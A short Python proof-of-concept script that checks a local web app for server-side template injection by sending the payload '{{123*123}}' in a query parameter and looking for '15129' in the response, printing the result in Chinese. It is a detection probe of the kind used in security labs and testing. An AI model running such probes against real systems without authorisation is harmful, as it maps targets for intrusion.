import requests


def POC(url):
    payload = "?name={{123*123}}"
    req = requests.get(url + payload)
    if "15129" in req.text:
        print("{} 存在 SSTI 服务端模板注入漏洞".format(url))
    else:
        print("{} 不存在 SSTI 服务端模板注入漏洞".format(url))


if __name__ == '__main__':
    url = "http://127.0.0.1:5000/"
    POC(url)
